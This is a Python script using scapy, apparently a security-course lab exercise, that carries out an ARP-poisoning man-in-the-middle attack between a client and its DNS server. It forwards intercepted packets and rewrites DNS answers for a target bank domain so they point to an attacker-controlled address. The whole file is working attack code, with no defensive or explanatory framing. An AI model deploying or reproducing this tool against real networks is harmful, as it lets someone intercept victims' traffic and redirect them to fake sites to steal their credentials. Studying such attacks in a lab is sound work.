#!/usr/bin/env python3
from scapy.all import *

import argparse
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    arp_request = ARP(op=1, pdst=IP, hwdst='ff:ff:ff:ff:ff:ff')
    resp = sr1(arp_request)
    return resp[ARP].hwsrc


#ARP spoofs client, dnsServer
def spoof_thread(clientIP, clientMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC, interval=3):
    while True:
        spoof(dnsServerIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP, attackerMAC, dnsServerIP, dnsServerMAC) # TODO: Spoof dnsServer ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    gratuitous_arp = ARP(op=2, psrc=srcIP, hwsrc=srcMAC, pdst=dstIP, hwdst=dstMAC)
    send(gratuitous_arp)


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    spoof(srcIP, srcMAC, dstIP, dstMAC)

def fakedns(packet):
    try:
        qname = packet[DNSQR].qname
        qname = qname.decode('utf-8')
        debug(f'Client is trying to resolve {qname}')
        if qname != 'www.bankofbailey.com.':
            debug('Not our target domain')
            return packet
        packet[DNS].an = DNSRR(rrname=qname, rdata='10.4.63.200')
        packet[DNS].ancount = 1
        del packet[IP].len
        del packet[IP].chksum
        del packet[UDP].len
        del packet[UDP].chksum
        return packet
    except Exception as e:
        debug(f'Error in fakedns: {e}')
        return packet

def handle_packet(p):
    global clientMAC, clientIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
    try:
        if p[Ether].src == attackerMAC: # Ignore our own spoofing packets
            return;
        debug(f'Sniffed: {p.summary()}')

        if p.haslayer(DNSRR):
            p=fakedns(p)
            debug(f'DNS modified: {p.summary()}')

        p[Ether].src=attackerMAC
        if p[IP].dst == dnsServerIP: p[Ether].dst = dnsServerMAC
        if p[IP].dst == clientIP: p[Ether].dst = clientMAC
        sendp(p, iface=conf.iface)
    except Exception as e:
        debug(f'Error when sniffing: {e}')
    pass

# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
def interceptor(packet):
    global clientMAC, clientIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
    bpf = (f"(dst host {clientIP}) or ((src host {clientIP} and ((dst host {dnsServerIP}))))")
    debug(f'Sniffer use BPF: {bpf}')
    sniff(store=0, filter=bpf, prn=handle_packet,
            stop_filter=lambda x: False, iface=conf.iface)


if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    dnsServerIP = args.serverIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    dnsServerMAC = mac(dnsServerIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
        restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
    restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
